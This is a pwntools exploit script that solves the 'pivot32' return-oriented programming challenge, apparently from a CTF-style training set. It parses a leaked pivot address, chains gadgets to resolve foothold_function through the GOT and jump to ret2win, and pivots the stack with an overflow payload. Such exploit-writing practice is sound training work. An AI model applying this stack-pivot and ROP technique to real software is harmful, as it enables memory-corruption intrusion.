#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'


# pivot32
elf = ELF('pivot32')
foothold_function_got = elf.got['foothold_function']
foothold_function_plt = elf.symbols['foothold_function']


# libpivot32.so
lib = ELF('libpivot32.so')
offset = lib.symbols['ret2win'] - lib.symbols['foothold_function']


# ROP Gadgets
gadget1 = 0x080488c0  # pop eax
gadget2 = 0x080488c2  # xchg esp, eax ; ret
gadget3 = 0x080488c7  # add eax, ebx ; ret
gadget4 = 0x080488c4  # mov eax, dword ptr [eax] ; ret
gadget5 = 0x08048571  # pop ebx ; ret
gadget6 = 0x080486a3  # call eax


if __name__ == '__main__':
    proc = elf.process()

    # The Old Gods kindly bestow upon you a place to pivot: <addr>
    # this pivot dest addr is random!!!
    proc.recvuntil('pivot: ')

    # Send your second chain now and it will land there
    # > 
    pivot_dest_str = proc.recvuntil('> ').decode('utf-8').split('\n')[0]
    pivot_dest = int(pivot_dest_str, 16)

    log.debug("pivot_dest: " + hex(pivot_dest))
    log.debug('offset (ret2win - foothold_function): ' + hex(offset))

    rop_chain =  p32(foothold_function_plt)
    rop_chain += p32(gadget1)
    rop_chain += p32(foothold_function_got)
    rop_chain += p32(gadget4)
    rop_chain += p32(gadget5)
    rop_chain += p32(offset)
    rop_chain += p32(gadget3)
    rop_chain += p32(gadget6)

    payload =  11 * b'AAAA'
    payload += p32(gadget1)
    payload += p32(pivot_dest)
    payload += p32(gadget2)

    #sys.stdout.buffer.write(rop_chain + b'\n' + payload)


    proc.sendline(rop_chain)

    # Now kindly send your stack smash
    # > 
    proc.recvuntil('> ')
    proc.sendline(payload)
    proc.interactive()
